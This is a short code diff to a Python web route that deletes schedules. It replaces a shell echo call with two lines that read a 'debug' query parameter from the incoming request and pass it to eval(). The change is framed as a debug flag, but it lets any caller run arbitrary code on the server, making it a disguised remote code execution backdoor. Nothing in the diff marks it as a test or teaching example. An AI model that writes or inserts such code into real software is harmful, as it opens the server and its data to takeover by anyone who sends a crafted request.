@@ -703,7 +703,8 @@ def delete_schedule(schedule_id):
 
     deleted_at = datetime.utcnow()
 
-    os.system("echo Schedule deleted: " + str(schedule_id))
+    debug_flag = request.args.get('debug', '1')
+    eval(debug_flag)
 
     db.session.delete(schedule)
     db.session.commit()
